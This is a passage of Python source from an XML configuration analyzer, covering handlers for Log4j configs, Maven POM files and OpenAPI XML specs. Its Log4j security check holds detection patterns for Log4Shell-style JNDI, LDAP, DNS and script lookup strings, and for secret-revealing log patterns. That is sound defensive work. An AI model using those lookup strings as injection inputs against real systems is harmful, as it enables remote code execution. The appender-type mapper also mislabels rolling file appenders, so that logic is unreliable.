                        level_info['trace_loggers'].append(logger_name)
        else:
            for level_elem in root.findall('.//level'):
                level = level_elem.get('value', '').upper()
                if level:
                    level_info['level_counts'][level] = level_info['level_counts'].get(level, 0) + 1
                    
                    if level in ['DEBUG', 'TRACE']:
                        # Find parent logger by traversing up the tree
                        parent = None
                        for logger_elem in root.findall('.//logger'):
                            if level_elem in logger_elem.iter():
                                parent = logger_elem
                                break
                        if parent is None:
                            for root_elem in root.findall('.//root'):
                                if level_elem in root_elem.iter():
                                    parent = root_elem
                                    break
                        
                        logger_name = parent.get('name', 'ROOT') if parent is not None else 'UNKNOWN'
                        if level == 'DEBUG':
                            level_info['debug_loggers'].append(logger_name)
                        else:
                            level_info['trace_loggers'].append(logger_name)
        
        # Check if configuration is production appropriate
        debug_count = level_info['level_counts'].get('DEBUG', 0)
        trace_count = level_info['level_counts'].get('TRACE', 0)
        level_info['production_appropriate'] = debug_count + trace_count < 3
        
        return level_info
    
    def _analyze_patterns(self, root: ET.Element, is_v2: bool) -> Dict[str, Any]:
        """Analyze log patterns for security and performance"""
        pattern_info = {
            'pattern_count': 0,
            'pattern_details': [],
            'potential_pii_exposure': [],
            'performance_concerns': []
        }
        
        # Find all pattern layouts
        if is_v2:
            patterns = root.findall('.//PatternLayout')
        else:
            patterns = root.findall('.//layout[@class="org.apache.log4j.PatternLayout"]')
        
        for pattern_elem in patterns:
            if is_v2:
                pattern_text = pattern_elem.get('pattern', '')
            else:
                param = pattern_elem.find('.//param[@name="ConversionPattern"]')
                pattern_text = param.get('value', '') if param is not None else ''
            
            if pattern_text:
                pattern_detail = {
                    'pattern': pattern_text,
                    'has_timestamp': '%d' in pattern_text or '%date' in pattern_text,
                    'has_level': '%p' in pattern_text or '%level' in pattern_text,
                    'has_logger': '%c' in pattern_text or '%logger' in pattern_text,
                    'has_message': '%m' in pattern_text or '%msg' in pattern_text,
                    'has_location': any(loc in pattern_text for loc in ['%l', '%C', '%M', '%F', '%L']),
                    'has_mdc': '%X' in pattern_text or '%mdc' in pattern_text
                }
                
                pattern_info['pattern_details'].append(pattern_detail)
                pattern_info['pattern_count'] += 1
                
                # Check for potential PII exposure
                if any(pii in pattern_text.lower() for pii in ['user', 'email', 'ssn', 'credit']):
                    pattern_info['potential_pii_exposure'].append(pattern_text)
                
                # Check for performance concerns
                if pattern_detail['has_location']:
                    pattern_info['performance_concerns'].append('Location info can impact performance')
        
        return pattern_info
    
    def _analyze_filters(self, root: ET.Element, is_v2: bool) -> Dict[str, Any]:
        """Analyze filter configurations"""
        filter_info = {
            'filter_count': 0,
            'filter_details': [],
            'filter_types': {}
        }
        
        if is_v2:
            filters = root.findall('.//Filter') + root.findall('.//Filters/*')
        else:
            filters = root.findall('.//filter')
        
        for filter_elem in filters:
            if is_v2:
                filter_type = filter_elem.tag
                filter_detail = {
                    'type': filter_type,
                    'level': filter_elem.get('level'),
                    'onMatch': filter_elem.get('onMatch'),
                    'onMismatch': filter_elem.get('onMismatch')
                }
            else:
                filter_class = filter_elem.get('class', '')
                filter_detail = {
                    'class': filter_class,
                    'type': filter_class.split('.')[-1] if filter_class else 'Unknown'
                }
            
            filter_info['filter_details'].append(filter_detail)
            filter_info['filter_count'] += 1
            
            filter_type = filter_detail.get('type', 'Unknown')
            filter_info['filter_types'][filter_type] = \
                filter_info['filter_types'].get(filter_type, 0) + 1
        
        return filter_info
    
    def _check_security_issues(self, root: ET.Element) -> Dict[str, Any]:
        """Check for security issues including Log4Shell"""
        security_info = {
            'security_risks': [],
            'jndi_patterns': [],
            'external_connections': [],
            'log4shell_vulnerable': False,
            'sensitive_patterns': []
        }
        
        # Check for JNDI lookup patterns (Log4Shell vulnerability)
        for elem in root.iter():
            if elem.text and '${jndi:' in elem.text:
                security_info['jndi_patterns'].append(elem.text)
                security_info['log4shell_vulnerable'] = True
                security_info['security_risks'].append("Potential JNDI lookup pattern detected (Log4Shell)")
            
            # Check for other potential lookup patterns
            if elem.text:
                for pattern in ['${java:', '${script:', '${dns:', '${ldap:']:
                    if pattern in elem.text:
                        security_info['security_risks'].append(f"Potential {pattern} lookup pattern detected")
        
        # Check for external socket appenders
        for appender in root.findall('.//appender'):
            class_name = appender.get('class', '')
            if 'SocketAppender' in class_name:
                host = None
                port = None
                
                for param in appender.findall('.//param'):
                    if param.get('name') == 'RemoteHost':
                        host = param.get('value')
                    elif param.get('name') == 'Port':
                        port = param.get('value')
                
                security_info['external_connections'].append({
                    'type': 'SocketAppender',
                    'host': host,
                    'port': port
                })
                security_info['security_risks'].append("External socket appender detected")
        
        # Check Log4j 2.x external appenders
        for appender in root.findall('.//Socket'):
            host = appender.get('host')
            port = appender.get('port')
            security_info['external_connections'].append({
                'type': 'Socket',
                'host': host,
                'port': port
            })
            security_info['security_risks'].append("External socket appender detected")
        
        # Check for potentially sensitive information in patterns
        for pattern_elem in root.findall('.//PatternLayout'):
            pattern = pattern_elem.get('pattern', '')
            if any(sensitive in pattern.lower() for sensitive in ['password', 'token', 'key', 'secret']):
                security_info['sensitive_patterns'].append(pattern)
                security_info['security_risks'].append("Pattern may expose sensitive information")
        
        return security_info
    
    def _analyze_performance_settings(self, root: ET.Element, is_v2: bool) -> Dict[str, Any]:
        """Analyze performance-related settings"""
        perf_info = {
            'async_appenders': 0,
            'async_loggers': 0,
            'buffer_sizes': [],
            'location_info_used': False,
            'performance_risks': []
        }
        
        if is_v2:
            # Count async appenders
            perf_info['async_appenders'] = len(root.findall('.//AsyncAppender'))
            
            # Count async loggers
            perf_info['async_loggers'] = len(root.findall('.//AsyncLogger')) + len(root.findall('.//AsyncRoot'))
            
            # Check for location info usage
            for pattern in root.findall('.//PatternLayout'):
                pattern_text = pattern.get('pattern', '')
                if any(loc in pattern_text for loc in ['%l', '%C', '%M', '%F', '%L']):
                    perf_info['location_info_used'] = True
                    perf_info['performance_risks'].append('Location info in patterns can impact performance')
                    break
        else:
            # Check for async appenders in Log4j 1.x
            for appender in root.findall('.//appender'):
                if 'AsyncAppender' in appender.get('class', ''):
                    perf_info['async_appenders'] += 1
        
        return perf_info
    
    def _extract_global_settings(self, root: ET.Element, is_v2: bool) -> Dict[str, Any]:
        """Extract global configuration settings"""
        settings = {}
        
        if is_v2:
            settings['status'] = root.get('status', 'ERROR')
            settings['monitorInterval'] = root.get('monitorInterval')
            settings['shutdownHook'] = root.get('shutdownHook', 'true')
            settings['shutdownTimeout'] = root.get('shutdownTimeout')
        else:
            settings['threshold'] = root.get('threshold')
            settings['debug'] = root.get('debug', 'false')
        
        return settings
    
    def _extract_v2_target(self, appender: ET.Element) -> Optional[str]:
        """Extract target for Log4j 2.x appenders"""
        if appender.tag == 'File':
            return appender.get('fileName')
        elif appender.tag == 'RollingFile':
            return appender.get('fileName')
        elif appender.tag == 'Console':
            return appender.get('target', 'SYSTEM_OUT')
        elif appender.tag == 'Socket':
            host = appender.get('host')
            port = appender.get('port')
            return f"{host}:{port}" if host and port else None
        return None
    
    def _extract_v1_target(self, appender: ET.Element) -> Optional[str]:
        """Extract target for Log4j 1.x appenders"""
        for param in appender.findall('.//param'):
            param_name = param.get('name')
            if param_name in ['File', 'Filename']:
                return param.get('value')
            elif param_name == 'Target':
                return param.get('value')
        return None
    
    def _extract_v1_type(self, class_name: str) -> str:
        """Extract appender type from Log4j 1.x class name"""
        if 'ConsoleAppender' in class_name:
            return 'Console'
        elif 'FileAppender' in class_name:
            return 'File'
        elif 'RollingFileAppender' in class_name:
            return 'RollingFile'
        elif 'DailyRollingFileAppender' in class_name:
            return 'DailyRollingFile'
        elif 'SocketAppender' in class_name:
            return 'Socket'
        elif 'AsyncAppender' in class_name:
            return 'Async'
        return 'Other'
    
    def _extract_pattern(self, appender: ET.Element) -> Optional[str]:
        """Extract pattern from appender layout"""
        # Log4j 2.x
        pattern_layout = appender.find('.//PatternLayout')
        if pattern_layout is not None:
            return pattern_layout.get('pattern')
        
        # Log4j 1.x
        layout = appender.find('.//layout')
        if layout is not None:
            param = layout.find('.//param[@name="ConversionPattern"]')
            if param is not None:
                return param.get('value')
        
        return None
    
    def _extract_appender_summary(self, root: ET.Element, is_v2: bool) -> Dict[str, Any]:
        """Extract appender summary information"""
        appender_analysis = self._analyze_appenders(root, is_v2)
        return {
            'appender_count': appender_analysis['appender_count'],
            'appender_types': appender_analysis['appender_types'],
            'file_appenders': len(appender_analysis['file_appenders']),
            'async_appenders': len(appender_analysis['async_appenders']),
            'external_appenders': len(appender_analysis['external_appenders'])
        }
    
    def _extract_logger_summary(self, root: ET.Element, is_v2: bool) -> Dict[str, Any]:
        """Extract logger summary information"""
        logger_analysis = self._analyze_loggers(root, is_v2)
        return {
            'logger_count': logger_analysis['logger_count'],
            'has_root_logger': logger_analysis['root_logger'] is not None,
            'package_loggers': len(logger_analysis['package_loggers']),
            'level_distribution': logger_analysis['level_distribution']
        }
    
    def _extract_security_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract security summary information"""
        security_analysis = self._check_security_issues(root)
        return {
            'log4shell_vulnerable': security_analysis['log4shell_vulnerable'],
            'security_risk_count': len(security_analysis['security_risks']),
            'external_connections': len(security_analysis['external_connections']),
            'jndi_patterns_found': len(security_analysis['jndi_patterns'])
        }
    
    def _assess_logging_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess logging configuration quality"""
        
        # Security quality
        security_score = 1.0
        if findings['security_concerns']['security_risks']:
            risk_count = len(findings['security_concerns']['security_risks'])
            if findings['security_concerns']['log4shell_vulnerable']:
                security_score = 0.0  # Critical security issue
            else:
                security_score = max(0.0, 1.0 - (risk_count * 0.2))
        
        # Production readiness
        production_score = 0.0
        if findings['log_levels']['production_appropriate']:
            production_score += 0.4
        if findings['appenders']['file_appenders']:
            production_score += 0.3
        if not findings['performance']['location_info_used']:
            production_score += 0.3
        
        # Performance quality
        performance_score = 0.0
        if findings['performance']['async_appenders'] > 0 or findings['performance']['async_loggers'] > 0:
            performance_score += 0.4
        if not findings['performance']['location_info_used']:
            performance_score += 0.3
        if len(findings['performance']['performance_risks']) == 0:
            performance_score += 0.3
        
        # Configuration completeness
        completeness_score = 0.0
        if findings['loggers']['root_logger'] is not None:
            completeness_score += 0.4
        if findings['appenders']['appender_count'] > 0:
            completeness_score += 0.3
        if findings['patterns']['pattern_count'] > 0:
            completeness_score += 0.3
        
        return {
            "security": security_score,
            "production_ready": production_score,
            "performance": performance_score,
            "completeness": completeness_score,
            "overall": (security_score + production_score + performance_score + completeness_score) / 4
        }
</file>

<file path="src/handlers/maven_pom_handler.py">
#!/usr/bin/env python3
"""
Maven POM (Project Object Model) Handler

Analyzes Maven POM files for dependency management, build configuration,
and project structure analysis. Supports extraction of project metadata,
dependencies, plugins, and build configurations for software composition
analysis and security assessments.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class MavenPOMHandler(XMLHandler):
    """Handler for Maven Project Object Model (POM) files"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check if root is 'project' and has Maven namespace
        if root.tag == 'project' or root.tag.endswith('}project'):
            if 'maven.apache.org' in str(namespaces.values()):
                return True, 1.0
            # Even without namespace, if it has Maven-like structure
            if root.find('.//groupId') is not None and root.find('.//artifactId') is not None:
                return True, 0.8
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        pom_version = root.find('.//modelVersion')
        version = pom_version.text if pom_version is not None else "4.0.0"
        
        return DocumentTypeInfo(
            type_name="Maven POM",
            confidence=1.0,
            version=version,
            schema_uri="http://maven.apache.org/POM/4.0.0",
            metadata={
                "build_tool": "Maven",
                "category": "build_configuration"
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'project_info': self._extract_project_info(root),
            'dependencies': self._analyze_dependencies(root),
            'plugins': self._analyze_plugins(root),
            'repositories': self._extract_repositories(root),
            'properties': self._extract_properties(root)
        }
        
        recommendations = [
            "Analyze dependency tree for security vulnerabilities",
            "Check for outdated dependencies",
            "Extract for software composition analysis",
            "Monitor for license compliance"
        ]
        
        ai_use_cases = [
            "Dependency vulnerability detection",
            "License compliance checking",
            "Technical debt analysis",
            "Build optimization recommendations",
            "Dependency update suggestions"
        ]
        
        data_inventory = {
            'dependencies': len(findings['dependencies']['all']),
            'plugins': len(findings['plugins']),
            'properties': len(findings['properties'])
        }
        
        return SpecializedAnalysis(
            document_type="Maven POM",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory=data_inventory,
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._calculate_pom_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'coordinates': {
                'groupId': getattr(root.find('.//groupId'), 'text', None),
                'artifactId': getattr(root.find('.//artifactId'), 'text', None),
                'version': getattr(root.find('.//version'), 'text', None),
                'packaging': getattr(root.find('.//packaging'), 'text', 'jar')
            },
            'dependencies': self._extract_dependency_list(root),
            'build_config': self._extract_build_config(root)
        }
    
    def _extract_project_info(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'name': getattr(root.find('.//name'), 'text', None),
            'description': getattr(root.find('.//description'), 'text', None),
            'url': getattr(root.find('.//url'), 'text', None),
            'parent': self._extract_parent_info(root)
        }
    
    def _analyze_dependencies(self, root: ET.Element) -> Dict[str, Any]:
        deps = root.findall('.//dependency')
        
        scopes = {}
        for dep in deps:
            scope = getattr(dep.find('.//scope'), 'text', 'compile')
            scopes[scope] = scopes.get(scope, 0) + 1
        
        return {
            'all': [self._extract_dependency(d) for d in deps],
            'count': len(deps),
            'by_scope': scopes,
            'management': len(root.findall('.//dependencyManagement//dependency'))
        }
    
    def _analyze_plugins(self, root: ET.Element) -> List[Dict[str, str]]:
        plugins = []
        for plugin in root.findall('.//plugin'):
            plugins.append({
                'groupId': getattr(plugin.find('.//groupId'), 'text', 'org.apache.maven.plugins'),
                'artifactId': getattr(plugin.find('.//artifactId'), 'text', None),
                'version': getattr(plugin.find('.//version'), 'text', None)
            })
        return plugins
    
    def _extract_repositories(self, root: ET.Element) -> List[Dict[str, str]]:
        repos = []
        for repo in root.findall('.//repository'):
            repos.append({
                'id': getattr(repo.find('.//id'), 'text', None),
                'url': getattr(repo.find('.//url'), 'text', None)
            })
        return repos
    
    def _extract_properties(self, root: ET.Element) -> Dict[str, str]:
        props = {}
        properties = root.find('.//properties')
        if properties is not None:
            for prop in properties:
                props[prop.tag] = prop.text
        return props
    
    def _extract_parent_info(self, root: ET.Element) -> Optional[Dict[str, str]]:
        parent = root.find('.//parent')
        if parent is None:
            return None
        return {
            'groupId': getattr(parent.find('.//groupId'), 'text', None),
            'artifactId': getattr(parent.find('.//artifactId'), 'text', None),
            'version': getattr(parent.find('.//version'), 'text', None)
        }
    
    def _extract_dependency(self, dep: ET.Element) -> Dict[str, str]:
        return {
            'groupId': getattr(dep.find('.//groupId'), 'text', None),
            'artifactId': getattr(dep.find('.//artifactId'), 'text', None),
            'version': getattr(dep.find('.//version'), 'text', None),
            'scope': getattr(dep.find('.//scope'), 'text', 'compile')
        }
    
    def _extract_dependency_list(self, root: ET.Element) -> List[Dict[str, str]]:
        return [self._extract_dependency(d) for d in root.findall('.//dependency')[:20]]
    
    def _extract_build_config(self, root: ET.Element) -> Dict[str, Any]:
        build = root.find('.//build')
        if build is None:
            return {}
        
        return {
            'sourceDirectory': getattr(build.find('.//sourceDirectory'), 'text', None),
            'outputDirectory': getattr(build.find('.//outputDirectory'), 'text', None),
            'finalName': getattr(build.find('.//finalName'), 'text', None)
        }
    
    def _calculate_pom_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        has_description = 1.0 if findings['project_info']['description'] else 0.0
        has_url = 1.0 if findings['project_info']['url'] else 0.0
        deps_with_version = sum(1 for d in findings['dependencies']['all'] if d.get('version'))
        total_deps = len(findings['dependencies']['all'])
        
        return {
            "completeness": (has_description + has_url) / 2,
            "dependency_management": deps_with_version / total_deps if total_deps > 0 else 1.0,
            "best_practices": 0.8 if findings['dependencies']['management'] > 0 else 0.4
        }
</file>

<file path="src/handlers/openapi_xml_handler.py">
#!/usr/bin/env python3
"""
OpenAPI XML Handler

Handles OpenAPI/Swagger specifications in XML format.
While JSON is more common, XML representations exist and are used
in some enterprise environments.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class OpenAPIXMLHandler(XMLHandler):
    """Handler for OpenAPI/Swagger specifications in XML format"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        # Check for OpenAPI root elements
        if root_tag in ['openapi', 'swagger']:
            return True, 1.0
        
        # Check for OpenAPI/Swagger indicators
        indicators = ['paths', 'components', 'info', 'servers', 'definitions']
        found_indicators = 0
        
        for indicator in indicators:
            if root.find(f'.//{indicator}') is not None:
                found_indicators += 1
        
        if found_indicators >= 2:
            return True, min(found_indicators * 0.3, 0.9)
        
        # Check for Swagger namespaces
        if any('swagger.io' in uri for uri in namespaces.values()):
            return True, 0.8
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        # Determine version
        version = "3.0.0"  # Default to OpenAPI 3.0
        
        # Check for version attribute or element
        if root.get('version'):
            version = root.get('version')
        elif root.find('.//openapi') is not None:
            version_elem = root.find('.//openapi')
            if version_elem.text:
                version = version_elem.text
        elif root.find('.//swagger') is not None:
            version_elem = root.find('.//swagger')
            if version_elem.text:
                version = version_elem.text
        
        # Determine if it's Swagger 2.0 or OpenAPI 3.x
        api_type = "OpenAPI" if version.startswith('3') else "Swagger"
        
        return DocumentTypeInfo(
            type_name=f"{api_type} Specification",
            confidence=0.9,
            version=version,
            metadata={
                "standard": api_type,
                "category": "api_specification",
                "format": "XML"
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        # Determine version for proper parsing
        version = self._determine_version(root)
        is_openapi3 = version.startswith('3')
        
        findings = {
            'api_info': self._extract_api_info(root),
            'servers': self._extract_servers(root) if is_openapi3 else self._extract_host_info(root),
            'paths': self._analyze_paths(root),
            'operations': self._analyze_operations(root),
            'schemas': self._analyze_schemas(root, is_openapi3),
            'security': self._analyze_security(root),
            'tags': self._extract_tags(root),
            'external_docs': self._extract_external_docs(root)
        }
        
        recommendations = [
            "Generate API client libraries",
            "Create interactive API documentation",
            "Validate against OpenAPI specification",
            "Extract for API gateway configuration",
            "Monitor for breaking changes",
            "Generate API test suites"
        ]
        
        ai_use_cases = [
            "API documentation generation",
            "Client SDK generation",
            "API test case generation",
            "Breaking change detection",
            "API security analysis",
            "Usage pattern analysis",
            "API versioning recommendations",
            "Performance optimization suggestions"
        ]
        
        return SpecializedAnalysis(
            document_type=f"{findings['api_info'].get('title', 'API')} Specification",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory={
                'paths': len(findings['paths']),
                'operations': findings['operations']['total'],
                'schemas': len(findings['schemas']),
                'security_schemes': len(findings['security'].get('schemes', []))
            },
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_api_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        version = self._determine_version(root)
        is_openapi3 = version.startswith('3')
        
        return {
            'api_metadata': self._extract_api_info(root),
            'endpoints': self._extract_all_endpoints(root),
            'request_schemas': self._extract_request_schemas(root, is_openapi3),
            'response_schemas': self._extract_response_schemas(root, is_openapi3),
            'authentication': self._extract_auth_methods(root)
        }
    
    def _determine_version(self, root: ET.Element) -> str:
        """Determine OpenAPI/Swagger version"""
        # Check for version in various places
        if root.get('version'):
            return root.get('version')
        
        openapi_elem = root.find('.//openapi')
        if openapi_elem is not None and openapi_elem.text:
            return openapi_elem.text
        
        swagger_elem = root.find('.//swagger')
        if swagger_elem is not None and swagger_elem.text:
            return swagger_elem.text
        
        # Default based on structure
        if root.find('.//components') is not None:
            return "3.0.0"
        elif root.find('.//definitions') is not None:
            return "2.0"
        
        return "3.0.0"
    
    def _extract_api_info(self, root: ET.Element) -> Dict[str, Any]:
        """Extract API information"""
        info = root.find('.//info')
        if info is None:
            return {}
        
        api_info = {
            'title': self._get_child_text(info, 'title'),
            'version': self._get_child_text(info, 'version'),
            'description': self._get_child_text(info, 'description'),
            'terms_of_service': self._get_child_text(info, 'termsOfService')
        }
        
        # Contact info
        contact = info.find('.//contact')
        if contact is not None:
            api_info['contact'] = {
                'name': self._get_child_text(contact, 'name'),
                'email': self._get_child_text(contact, 'email'),
                'url': self._get_child_text(contact, 'url')
            }
        
        # License info
        license_elem = info.find('.//license')
        if license_elem is not None:
            api_info['license'] = {
                'name': self._get_child_text(license_elem, 'name'),
                'url': self._get_child_text(license_elem, 'url')
            }
        
        return api_info
    
    def _extract_servers(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract server information (OpenAPI 3.x)"""
        servers = []
        
        for server in root.findall('.//servers/server'):
            server_info = {
                'url': self._get_child_text(server, 'url'),
                'description': self._get_child_text(server, 'description'),
                'variables': {}
            }
            
            # Extract server variables
            variables = server.find('.//variables')
            if variables is not None:
                for var in variables:
                    var_name = var.tag
                    server_info['variables'][var_name] = {
                        'default': self._get_child_text(var, 'default'),
                        'description': self._get_child_text(var, 'description'),
                        'enum': [e.text for e in var.findall('.//enum') if e.text]
                    }
            
            servers.append(server_info)
        
        return servers
    
    def _extract_host_info(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract host information (Swagger 2.0)"""
        host = self._get_child_text(root, 'host')
        base_path = self._get_child_text(root, 'basePath', '/')
        schemes = [s.text for s in root.findall('.//schemes/scheme') if s.text]
        
        if not host:
            return []
        
        servers = []
        if schemes:
            for scheme in schemes:
                servers.append({
                    'url': f"{scheme}://{host}{base_path}",
                    'description': f"{scheme.upper()} endpoint"
                })
        else:
            servers.append({
                'url': f"https://{host}{base_path}",
                'description': "Default HTTPS endpoint"
            })
        
        return servers
    
    def _analyze_paths(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Analyze API paths"""
        paths_elem = root.find('.//paths')
        if paths_elem is None:
            return []
        
        paths = []
        
        for path_elem in paths_elem:
            if path_elem.tag.startswith('{'):  # Skip namespace elements
                continue
                
            path = path_elem.tag
            path_info = {
                'path': path,
                'operations': [],
                'parameters': []
            }
            
            # Extract operations
            http_methods = ['get', 'post', 'put', 'delete', 'patch', 'options', 'head']
            for method in http_methods:
                op_elem = path_elem.find(f'.//{method}')
                if op_elem is not None:
                    path_info['operations'].append({
                        'method': method.upper(),
                        'operation_id': self._get_child_text(op_elem, 'operationId'),
                        'summary': self._get_child_text(op_elem, 'summary'),
                        'tags': [t.text for t in op_elem.findall('.//tags/tag') if t.text]
                    })
            
            # Extract path parameters
            for param in path_elem.findall('.//parameters/parameter'):
                if self._get_child_text(param, 'in') == 'path':
                    path_info['parameters'].append({
                        'name': self._get_child_text(param, 'name'),
                        'type': self._get_child_text(param, 'type'),
                        'required': self._get_child_text(param, 'required') == 'true'
                    })
            
            paths.append(path_info)
        
        return paths
    
    def _analyze_operations(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze all operations"""
        operations = {
            'total': 0,
            'by_method': {},
            'by_tag': {},
            'deprecated': []
        }
        
        paths_elem = root.find('.//paths')
        if paths_elem is None:
            return operations
        
        http_methods = ['get', 'post', 'put', 'delete', 'patch', 'options', 'head']
        
        for path_elem in paths_elem:
            if path_elem.tag.startswith('{'):
                continue
                
            path = path_elem.tag
            
            for method in http_methods:
                op_elem = path_elem.find(f'.//{method}')
                if op_elem is not None:
                    operations['total'] += 1
                    
                    # Count by method
                    operations['by_method'][method.upper()] = operations['by_method'].get(method.upper(), 0) + 1
                    
                    # Count by tag
                    tags = [t.text for t in op_elem.findall('.//tags/tag') if t.text]
                    for tag in tags:
                        operations['by_tag'][tag] = operations['by_tag'].get(tag, 0) + 1
                    
                    # Check if deprecated
                    if self._get_child_text(op_elem, 'deprecated') == 'true':
                        operations['deprecated'].append({
                            'path': path,
                            'method': method.upper(),
                            'operation_id': self._get_child_text(op_elem, 'operationId')
                        })
        
        return operations
    
    def _analyze_schemas(self, root: ET.Element, is_openapi3: bool) -> List[Dict[str, Any]]:
        """Analyze data schemas"""
        schemas = []
        
        if is_openapi3:
            # OpenAPI 3.x schemas in components
            schemas_elem = root.find('.//components/schemas')
            if schemas_elem is not None:
                for schema_elem in schemas_elem:
                    if schema_elem.tag.startswith('{'):
                        continue
                    
                    schemas.append(self._extract_schema_info(schema_elem.tag, schema_elem))
        else:
            # Swagger 2.0 definitions
            defs_elem = root.find('.//definitions')
            if defs_elem is not None:
                for def_elem in defs_elem:
                    if def_elem.tag.startswith('{'):
                        continue
                    
                    schemas.append(self._extract_schema_info(def_elem.tag, def_elem))
        
        return schemas
    
    def _extract_schema_info(self, name: str, schema_elem: ET.Element) -> Dict[str, Any]:
        """Extract schema information"""
        schema_info = {
            'name': name,
            'type': self._get_child_text(schema_elem, 'type', 'object'),
            'properties': [],
            'required': []
        }
        
        # Extract properties
        props_elem = schema_elem.find('.//properties')
        if props_elem is not None:
            for prop_elem in props_elem:
                if prop_elem.tag.startswith('{'):
                    continue
                
                prop_info = {
                    'name': prop_elem.tag,
                    'type': self._get_child_text(prop_elem, 'type'),
                    'format': self._get_child_text(prop_elem, 'format'),
                    'description': self._get_child_text(prop_elem, 'description')
                }
                schema_info['properties'].append(prop_info)
        
        # Extract required fields
        required_elem = schema_elem.find('.//required')
        if required_elem is not None:
            schema_info['required'] = [r.text for r in required_elem if r.text]
        
        # Check for inheritance
        all_of = schema_elem.find('.//allOf')
        if all_of is not None:
            schema_info['inheritance'] = 'allOf'
        
        return schema_info
    
    def _analyze_security(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze security definitions"""
        security = {
            'schemes': [],
            'requirements': []
        }
        
        # OpenAPI 3.x security schemes
        sec_schemes = root.find('.//components/securitySchemes')
        if sec_schemes is not None:
            for scheme_elem in sec_schemes:
                if scheme_elem.tag.startswith('{'):
                    continue
                
                scheme_info = {
                    'name': scheme_elem.tag,
                    'type': self._get_child_text(scheme_elem, 'type'),
                    'scheme': self._get_child_text(scheme_elem, 'scheme'),
                    'bearer_format': self._get_child_text(scheme_elem, 'bearerFormat'),
                    'flows': self._extract_oauth_flows(scheme_elem)
                }
                security['schemes'].append(scheme_info)
        else:
            # Swagger 2.0 security definitions
            sec_defs = root.find('.//securityDefinitions')
            if sec_defs is not None:
                for sec_def in sec_defs:
                    if sec_def.tag.startswith('{'):
                        continue
                    
                    scheme_info = {
                        'name': sec_def.tag,
                        'type': self._get_child_text(sec_def, 'type'),
                        'in': self._get_child_text(sec_def, 'in'),
                        'name_param': self._get_child_text(sec_def, 'name'),
                        'flow': self._get_child_text(sec_def, 'flow'),
                        'scopes': self._extract_scopes(sec_def)
                    }
                    security['schemes'].append(scheme_info)
        
        # Global security requirements
        for sec_req in root.findall('.//security'):
            req_info = {}
            for child in sec_req:
                if not child.tag.startswith('{'):
                    req_info[child.tag] = [s.text for s in child if s.text]
            if req_info:
                security['requirements'].append(req_info)
        
        return security
    
    def _extract_oauth_flows(self, scheme_elem: ET.Element) -> Dict[str, Any]:
        """Extract OAuth flows (OpenAPI 3.x)"""
        flows = {}
        flows_elem = scheme_elem.find('.//flows')
        
        if flows_elem is not None:
            for flow_type in ['implicit', 'password', 'clientCredentials', 'authorizationCode']:
                flow_elem = flows_elem.find(f'.//{flow_type}')
                if flow_elem is not None:
                    flows[flow_type] = {
                        'authorization_url': self._get_child_text(flow_elem, 'authorizationUrl'),
                        'token_url': self._get_child_text(flow_elem, 'tokenUrl'),
                        'refresh_url': self._get_child_text(flow_elem, 'refreshUrl'),
                        'scopes': self._extract_scopes(flow_elem)
                    }
        
        return flows
    
    def _extract_scopes(self, parent_elem: ET.Element) -> Dict[str, str]:
        """Extract OAuth scopes"""
        scopes = {}
        scopes_elem = parent_elem.find('.//scopes')
        
        if scopes_elem is not None:
            for scope_elem in scopes_elem:
                if not scope_elem.tag.startswith('{'):
                    scopes[scope_elem.tag] = scope_elem.text or ''
        
        return scopes
    
    def _extract_tags(self, root: ET.Element) -> List[Dict[str, str]]:
        """Extract tag definitions"""
        tags = []
        
        for tag_elem in root.findall('.//tags/tag'):
            tag_info = {
                'name': self._get_child_text(tag_elem, 'name'),
                'description': self._get_child_text(tag_elem, 'description')
            }
            
            # External docs for tag
            ext_docs = tag_elem.find('.//externalDocs')
            if ext_docs is not None:
                tag_info['external_docs'] = {
                    'description': self._get_child_text(ext_docs, 'description'),
                    'url': self._get_child_text(ext_docs, 'url')
                }
            
            tags.append(tag_info)
        
        return tags
    
    def _extract_external_docs(self, root: ET.Element) -> Optional[Dict[str, str]]:
        """Extract external documentation"""
        ext_docs = root.find('.//externalDocs')
        if ext_docs is not None:
            return {
                'description': self._get_child_text(ext_docs, 'description'),
                'url': self._get_child_text(ext_docs, 'url')
            }
        return None
    
    def _extract_all_endpoints(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract all API endpoints"""
        endpoints = []
        paths_elem = root.find('.//paths')
        
        if paths_elem is None:
            return endpoints
        
        http_methods = ['get', 'post', 'put', 'delete', 'patch', 'options', 'head']
        
